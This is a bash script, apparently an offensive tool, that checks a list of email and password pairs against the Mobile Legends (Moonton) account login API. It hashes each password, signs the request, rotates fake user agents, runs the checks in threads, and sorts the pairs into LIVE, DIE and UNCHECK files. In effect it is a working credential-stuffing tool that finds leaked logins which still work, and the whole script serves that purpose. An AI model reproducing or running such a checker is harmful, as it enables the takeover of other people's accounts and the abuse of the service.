#!/usr/bin/bash
## Moonton Account Checker

green='\e[92m'
blue='\e[34m'
red='\e[31m'
white='\e[39m'
bold='\e[1m'
yell='\e[33m'

cat <<EOF

Moonton Account Checker

Powered By Wibu Heker

EOF

read -p "[?] Mail List : " l
if [[ ! -f $l ]]; then
    echo "[-] File $l Not Exist"
    exit 1
fi

read -p "[?] Threads : " t

read -p "[?] Delay : " d
total=$[`cat $l | wc -l`+1]
echo -e "${blue}${total}${white} Mail Loaded..."

count=0;
pp=0;
live=0;
die=0;
uncheck=0;
IFS=$'\r\n'
for email in $(cat $l); do
    ((cthread=cthread%t)); ((cthread++==0)) && wait
    if [[ $pp == $d ]]; then
        echo -e "${blue}Delaying for ${d} ...${white}"
        pp=0;
        sleep $d
    fi
    date=$(date '+%H:%M:%S')
    count=$[$count+1]
    pp=$[$pp+1];
    user=$(echo -n "$email" | cut -d "|" -f 1)
    pass=$(echo -n "$email" | cut -d "|" -f 2)
    md5p=$(echo -n "$pass" | md5sum | awk '{print $1}')
    randAgent="Mozilla/${RANDOM:0:1}.${RANDOM:0:1} (Ubuntu ${RANDOM:0:1}.${RANDOM:0:1};en-US;)"
    bruh=$(echo -n "account=${user}&md5pwd=${md5p}&op=login" | md5sum | awk '{print $1}')
    data="{\"op\":\"login\",\"sign\":\"${bruh}\",\"params\":{\"account\":\"${user}\",\"md5pwd\":\"${md5p}\"},\"lang\":\"en\"}"
    curl=$(curl -s https://accountmtapi.mobilelegends.com/ --data "${data}" -H "User-Agent: ${randAgent}")
    parser=$(echo $curl | jq .message)
    if [[ "$parser" =~ "Error_Success" ]]; then
        live=$[$live+1]
        echo $email >> MOONTON_LIVE.txt
        echo -e "[${date}][${count}/${total}] ${user} | ${pass} | ${bold}${green}LIVE${white}"
    elif [[ "$parser" =~ "Error_PasswdError" ]]; then
        die=$[$die+1]
        echo $email >> MOONTON_DIE.txt
        echo -e "[${date}][${count}/${total}] ${mail} | ${pass} | ${bold}${red}DIE${white}"
    elif [[ "$parser" =~ "Error_NoAccount" ]]; then
        die=$[$die+1]
        echo $email >> MOONTON_DIE.txt
        echo -e "[${date}][${count}/${total}] ${mail} | ${pass} | ${bold}${red}DIE${white}"
    else
        uncheck=$[$uncheck+1]
        echo $email >> MOONTON_UNCHECK.txt
        echo -e "[${date}][${count}/${total}] ${mail} | ${pass} | ${bold}${yell}UNCHECK${white}"
    fi
done
wait
echo "LIVE: ${live}"
echo "DIE: ${die}"
echo "UNCHECK: ${uncheck}"
